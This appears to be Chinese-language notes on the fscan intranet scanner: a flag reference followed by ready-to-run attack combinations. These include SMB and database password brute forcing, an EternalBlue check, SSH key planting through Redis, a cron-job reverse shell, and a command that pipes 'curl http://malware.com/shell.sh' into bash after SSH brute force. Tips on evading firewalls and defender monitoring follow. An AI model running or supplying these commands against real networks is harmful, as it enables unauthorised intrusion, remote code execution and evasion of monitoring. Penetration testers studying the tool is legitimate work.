# fscan
基本命令,不在多说,展示一些组合
  ```
  -c string
        ssh命令执行
  -cookie string
        设置cookie
  -debug int
        多久没响应,就打印当前进度(default 60)
  -domain string
        smb爆破模块时,设置域名
  -h string
        目标ip: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12
  -hf string
        读取文件中的目标
  -hn string
        扫描时,要跳过的ip: -hn 192.168.1.1/24
  -m string
        设置扫描模式: -m ssh (default "all")
  -no
        扫描结果不保存到文件中
  -nobr
        跳过sql、ftp、ssh等的密码爆破
  -nopoc
        跳过web poc扫描
  -np
        跳过存活探测
  -num int
        web poc 发包速率  (default 20)
  -o string
        扫描结果保存到哪 (default "result.txt")
  -p string
        设置扫描的端口: 22 | 1-65535 | 22,80,3306 (default "21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017")
  -pa string
        新增需要扫描的端口,-pa 3389 (会在原有端口列表基础上,新增该端口)
  -path string
        fcgi、smb romote file path
  -ping
        使用ping代替icmp进行存活探测
  -pn string
        扫描时要跳过的端口,as: -pn 445
  -pocname string
        指定web poc的模糊名字, -pocname weblogic
  -proxy string
        设置代理, -proxy http://127.0.0.1:8080
  -user string
        指定爆破时的用户名
  -userf string
        指定爆破时的用户名文件
  -pwd string
        指定爆破时的密码
  -pwdf string
        指定爆破时的密码文件
  -rf string
        指定redis写公钥用模块的文件 (as: -rf id_rsa.pub)
  -rs string
        redis计划任务反弹shell的ip端口 (as: -rs 192.168.1.1:6666)
  -silent
        静默扫描,适合cs扫描时不回显
  -sshkey string
        ssh连接时,指定ssh私钥
  -t int
        扫描线程 (default 600)
  -time int
        端口扫描超时时间 (default 3)
  -u string
        指定Url扫描
  -uf string
        指定Url文件扫描
  -wt int
        web访问超时时间 (default 5)
  ```

应掌握的一些组合:
```
fscan -h 192.168.1.1/24 -np -nopoc -no
```
作用：跳过存活探测、POC扫描和文件保存，快速扫描存活主机及开放端口
​参数解析：
-np：关闭ICMP存活检测（直接扫描所有IP）
-nopoc：跳过Web漏洞扫描
-no：不保存结果文件

-----------------------------------------------------------------------
```
fscan -h 10.0.0.0/16 -np -nopoc -no -t 500
```
作用：10秒级完成B段存活主机和开放端口探测
​参数解析：
-np：跳过ICMP存活检测（强制扫描所有IP）
-nopoc：禁用Web漏洞扫描
-t 500：高线程加速扫描
​输出：生成包含开放端口、基础服务类型的结果文件 result.txt

-----------------------------------------------------------------------

```
fscan -h 192.168.1.1/24 -p 80,443,8080 -wt 10
```
作用：针对Web服务进行深度指纹识别（CMS框架、中间件版本）
​扩展：
配合 -pocpath ./custom_poc 加载自定义漏洞检测规则

-----------------------------------------------------------------------

```
fscan -h 172.16.1.1-200 -m smb,ms17010 -pwd Admin@123  
```
​场景：
检测永恒之蓝漏洞（ms17010）
碰撞SMB弱口令（默认账号如administrator）

-----------------------------------------------------------------------

```
fscan -hf db_ips.txt -m mssql,mysql -userf sa_users.txt -pwdf top100_pass.txt  
```
使用行业弱口令TOP100字典（如 Admin123、root@123）

-----------------------------------------------------------------------

```
fscan -h 10.10.1.1/24 -rf ~/.ssh/id_rsa.pub -rs 192.168.5.1:6666  
```
作用：
写入SSH公钥获取服务器权限（-rf）
通过计划任务反弹Shell（-rs）

-----------------------------------------------------------------------

```
fscan -h 192.168.1.100 -m ssh -c "curl http://malware.com/shell.sh | bash"  =
```
SSH爆破后执行命令

-----------------------------------------------------------------------

```
fscan -h 10.10.1.1/24 -socks5 127.0.0.1:1080 -silent
```
​作用：结合代理工具（如EarthWorm）隐藏扫描流量，静默模式减少日志记录

-----------------------------------------------------------------------

```
fscan -h 192.168.1.1/24 -t 100 -num 10
```

作用：降低线程数（-t 100）和POC发包速率（-num 10），减少触发告警的概率,规避防火墙检测

-----------------------------------------------------------------------

```
fscan -u http://target.com -pocname weblogic -proxy http://127.0.0.1:8080
```
作用：针对特定Web服务（如WebLogic）加载POC检测漏洞，并通过代理调试流量

-----------------------------------------------------------------------

```
fscan -h 10.0.0.1/24 -domain corp.local -m smb -pwd P@ssw0rd
```
作用：指定域环境（-domain）进行SMB密码碰撞，快速定位域管账户







-m	ssh,smb,ms17010	多模块联合扫描
-pa	-pa 3389,5985	追加扫描RDP、WinRM端口
-pn	-pn 445	跳过高危端口规避防守方监控
-path	-path /etc/passwd	指定文件读取路径（如FCGI漏洞）
-sshkey	-sshkey ~/.ssh/id_rsa	使用密钥登录SSH
